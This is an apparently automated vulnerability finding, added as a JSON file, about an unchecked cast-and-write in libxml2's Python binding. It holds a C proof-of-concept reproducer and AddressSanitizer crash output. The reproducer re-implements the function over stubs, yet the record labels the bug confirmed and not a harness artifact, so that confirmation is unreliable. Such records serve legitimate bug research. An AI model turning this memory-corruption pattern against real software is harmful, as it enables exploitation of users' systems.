@@ -1,0 +1,72 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "python/libxml.c",
+    "line": 615,
+    "function": "libxml_xmlSaveFormatFileTo",
+    "bug_type": "out-of-bounds-write",
+    "cwe": "CWE-787",
+    "confidence": "high",
+    "explanation": "Same unsafe pattern as in xmlSaveFileTo: pyobj_buf is cast to PyoutputBuffer_Object and written to without verifying type. If a non-output-buffer object is passed, ((PyoutputBuffer_Object *)pyobj_buf)->obj = NULL corrupts the target Python object's memory, leading to heap memory corruption.",
+    "abs_path": "/tmp/libxml2_upstream/python/libxml.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <string.h>\n#include <stdint.h>\n\n/* Minimal stand-ins for Python/libxml2 types used by the vulnerable binding */\ntypedef struct PyObject PyObject;\nstruct PyObject { char tiny; };\n\ntypedef void *xmlOutputBufferPtr;\ntypedef void *xmlDocPtr;\n\ntypedef struct {\n    void *obj; /* what the binding assumes is at offset 0 */\n} PyoutputBuffer_Object;\n\n/* A fake \"tuple\" container to pass arguments through our stub PyArg_ParseTuple */\ntypedef struct {\n    PyObject *a;         /* pyobj_buf */\n    PyObject *b;         /* pyobj_cur */\n    char *encoding;      /* encoding */\n    int format;          /* format */\n} FakeTuple;\n\n/* Stub: emulate Python's PyArg_ParseTuple for the exact call pattern used */\nint PyArg_ParseTuple(PyObject *args, const char *fmt, ...) {\n    (void)fmt; /* format string is ignored in this stub */\n    va_list ap;\n    va_start(ap, fmt);\n    PyObject **pyobj_buf = va_arg(ap, PyObject **);\n    PyObject **pyobj_cur = va_arg(ap, PyObject **);\n    char **encoding      = va_arg(ap, char **);\n    int *format          = va_arg(ap, int *);\n    va_end(ap);\n\n    FakeTuple *t = (FakeTuple *)args;\n    if (!t) return 0;\n    *pyobj_buf = t->a;\n    *pyobj_cur = t->b;\n    *encoding  = t->encoding;\n    *format    = t->format;\n    return 1; /* success */\n}\n\n/* Stub: return some heap buffer to act as the xmlOutputBufferPtr */\nxmlOutputBufferPtr PyoutputBuffer_Get(PyObject *obj) {\n    (void)obj;\n    /* allocate a fake output buffer the callee will free */\n    void *p = malloc(32);\n    memset(p, 0xCD, 32);\n    return p;\n}\n\n/* Stub: not used downstream for the bug */\nxmlDocPtr PyxmlNode_Get(PyObject *obj) {\n    (void)obj;\n    return NULL;\n}\n\n/* Stub: emulate libxml2 API that frees the output buffer */\nint xmlSaveFormatFileTo(xmlOutputBufferPtr buf, xmlDocPtr cur, char *encoding, int format) {\n    (void)cur; (void)encoding; (void)format;\n    /* The comment in the vulnerable code says this frees buf */\n    free(buf);\n    return 0;\n}\n\n/* Stub: wraps an int into a PyObject* (not actually used further) */\nPyObject *libxml_intWrap(int v) {\n    (void)v;\n    PyObject *o = (PyObject *)malloc(16);\n    memset(o, 0xAB, 16);\n    return o;\n}\n\n/* Vulnerable wrapper function mirroring python/libxml.c::libxml_xmlSaveFormatFileTo */\nPyObject *libxml_xmlSaveFormatFileTo(PyObject *self, PyObject *args) {\n    (void)self;\n    PyObject *py_retval;\n    int c_retval;\n    xmlOutputBufferPtr buf;\n    PyObject *pyobj_buf;\n    xmlDocPtr cur;\n    PyObject *pyobj_cur;\n    char *encoding;\n    int format;\n\n    if (!PyArg_ParseTuple(args, \"OOzi:xmlSaveFormatFileTo\", &pyobj_buf, &pyobj_cur, &encoding, &format))\n        return NULL;\n    buf = (xmlOutputBufferPtr) PyoutputBuffer_Get(pyobj_buf);\n    cur = (xmlDocPtr) PyxmlNode_Get(pyobj_cur);\n\n    c_retval = xmlSaveFormatFileTo(buf, cur, encoding, format);\n    /* Vulnerable write: blindly treats pyobj_buf as PyoutputBuffer_Object and writes to it */\n    ((PyoutputBuffer_Object *)(pyobj_buf))->obj = NULL; /* OOB write if pyobj_buf is not that type */\n\n    py_retval = libxml_intWrap((int) c_retval);\n    return py_retval;\n}\n\nint main(void) {\n    /* Craft a tiny heap allocation that is NOT an output buffer object */\n    void *small = malloc(1);          /* only 1 byte allocated */\n    memset(small, 0x41, 1);\n\n    /* Any other placeholder object for the document arg */\n    void *other = malloc(16);\n    memset(other, 0x42, 16);\n\n    FakeTuple t;\n    t.a = (PyObject *)small; /* pyobj_buf: intentionally not an output buffer object */\n    t.b = (PyObject *)other; /* pyobj_cur */\n    t.encoding = (char *)\"UTF-8\";\n    t.format = 1;\n\n    /* Call the vulnerable wrapper: this should trigger an OOB write via the cast+store */\n    PyObject *ret = libxml_xmlSaveFormatFileTo(NULL, (PyObject *)&t);\n\n    /* If we reach here without ASan abort, print something to avoid optimization */\n    printf(\"Returned object: %p\\n\", (void *)ret);\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.7488572597503662,
+      "output": "=================================================================\n==4003366==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000010 at pc 0x57297e8e9aa2 bp 0x7ffd07ffeab0 sp 0x7ffd07ffeaa8\nWRITE of size 8 at 0x602000000010 thread T0\n    #0 0x57297e8e9aa1 in libxml_xmlSaveFormatFileTo /app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:96:49\n    #1 0x57297e8e9da4 in main /app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:118:21\n    #2 0x78bea002a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x78bea002a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x57297e829304 in _start (/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer+0x21304) (BuildId: c616bb9b948c26ed1141d8ab1ed1fd244f89c074)\n\n0x602000000011 is located 0 bytes to the right of 1-byte region [0x602000000010,0x602000000011)\nallocated by thread T0 here:\n    #0 0x57297e8acd12 in __interceptor_malloc (/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer+0xa4d12) (BuildId: c616bb9b948c26ed1141d8ab1ed1fd244f89c074)\n    #1 0x57297e8e9c5a in main /app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:104:19\n    #2 0x78bea002a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x78bea002a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x57297e829304 in _start (/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer+0x21304) (BuildId: c616bb9b948c26ed1141d8ab1ed1fd244f89c074)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:96:49 in libxml_xmlSaveFormatFileTo\nShadow bytes around the buggy address:\n  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0c047fff8000: fa fa[01]fa fa fa 00 00 fa fa fa fa fa fa fa fa\n  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==4003366==ABORTING\n",
+      "error_type": "heap-buffer-overflow",
+      "crash_function": "libxml_xmlSaveFormatFileTo",
+      "crash_file": "/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:96",
+      "crash_line": 49,
+      "frames": [
+        [
+          "0",
+          "libxml_xmlSaveFormatFileTo",
+          "/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:96",
+          "49"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:118",
+          "21"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libxml2_e334a9d_vul/findings/libxml_615_out-of-bounds-write/reproducer.c:104",
+          "19"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
